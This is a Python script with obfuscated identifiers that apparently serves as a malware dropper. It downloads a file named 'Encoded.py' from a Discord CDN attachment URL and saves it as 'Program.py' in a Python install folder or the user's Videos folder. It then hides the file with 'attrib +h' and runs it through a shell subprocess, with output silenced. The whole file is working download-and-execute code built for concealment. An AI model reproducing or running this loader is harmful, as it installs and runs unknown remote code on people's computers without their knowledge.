import sys ,os ,requests ,subprocess #line:1
from pathlib import Path #line:2
from subprocess import CREATE_NO_WINDOW #line:3
filename ="Program.py"#line:5
def stopprint ():#line:8
    sys .stdout =open (os .devnull ,'w')#line:9
def startprint ():#line:11
    sys .stdout =sys .__stdout__ #line:12
def get_folder_contents (O0O00OOO0OOO000O0 ):#line:17
	try :#line:18
		O00000000OOO0000O =os .listdir (O0O00OOO0OOO000O0 )#line:19
		for OO00000OO0O0O0O0O in O00000000OOO0000O :#line:20
			if OO00000OO0O0O0O0O .lower ()=="python.exe":#line:21
				return True #line:22
	except :#line:23
		pass #line:24
	return False #line:25
def get_default_path ():#line:27
	try :#line:28
		O00O0OOO000O0OO0O =str (Path .home ()/"Videos")#line:29
		return O00O0OOO000O0OO0O #line:30
	except Exception as O000OOO00000O00OO :#line:31
		print (O000OOO00000O00OO )#line:32
		return None #line:33
def get_new_filepath (OOO0OOOOOO000O00O ,OO0O0O0OO0O0O0O0O ):#line:35
	return os .path .join (OOO0OOOOOO000O00O ,OO0O0O0OO0O0O0O0O )#line:36
def get_cdn ():#line:38
	return "https://cdn.discordapp.com/attachments/1033739850643406918/1034240047458824282/Encoded.py"#line:39
def get_content ():#line:41
	O0O0O0O00O0OO000O =get_cdn ()#line:42
	O0OOO000O00OOOOOO =requests .get (O0O0O0O00O0OO000O ).text #line:43
	return O0OOO000O00OOOOOO #line:44
def write_to_file (OO0OO00O0O0OO000O ,O0OO0O0O0000OOO00 ):#line:46
	O0O0O000O0O00O00O =open (OO0OO00O0O0OO000O ,"a")#line:47
	O0O0O000O0O00O00O .write (O0OO0O0O0000OOO00 )#line:48
	O0O0O000O0O00O00O .close ()#line:49
def hide_file (O00O0OO00O00O0O00 ):#line:51
    try :#line:52
        os .system (f"attrib +h {O00O0OO00O00O0O00}")#line:53
    except :#line:54
        pass #line:55
def run_file (O0OOOOO0O0OOO0OOO ):#line:57
	print ("Running")#line:60
	OO00O0O000O00OOOO =subprocess .Popen (f"python {O0OOOOO0O0OOO0OOO}",shell =True ,stdin =None ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,close_fds =True )#line:61
	OO00000O0O0O0OOO0 ,O0OOO00O000OO0O0O =OO00O0O000O00OOOO .communicate ()#line:62
	print (f"{OO00000O0O0O0OOO0}|{O0OOO00O000OO0O0O}")#line:63
def main ():#line:68

	O0O0O00000O0O0O00 =get_default_path ()#line:70
	print (O0O0O00000O0O0O00 )#line:71
	for O000OO0OOOO00OO00 in sys .path :#line:72
		OOOOOO0OOOO0OO000 =get_folder_contents (O000OO0OOOO00OO00 )#line:74
		if OOOOOO0OOOO0OO000 ==True :#line:75
			O0O0O00000O0O0O00 =O000OO0OOOO00OO00 #line:76
			break #line:77
	OOOOOOO000O0OO000 =get_new_filepath (O0O0O00000O0O0O00 ,filename )#line:79
	print (OOOOOOO000O0OO000 )#line:80
	OOO0OO000O0OOO000 =get_content ()#line:81
	if os .path .exists (OOOOOOO000O0OO000 )==True :#line:82
		print ("Already done")#line:83
		return #line:84
	write_to_file (OOOOOOO000O0OO000 ,OOO0OO000O0OOO000 )#line:85
	hide_file (OOOOOOO000O0OO000 )#line:86
	run_file (OOOOOOO000O0OO000 )#line:87
main ()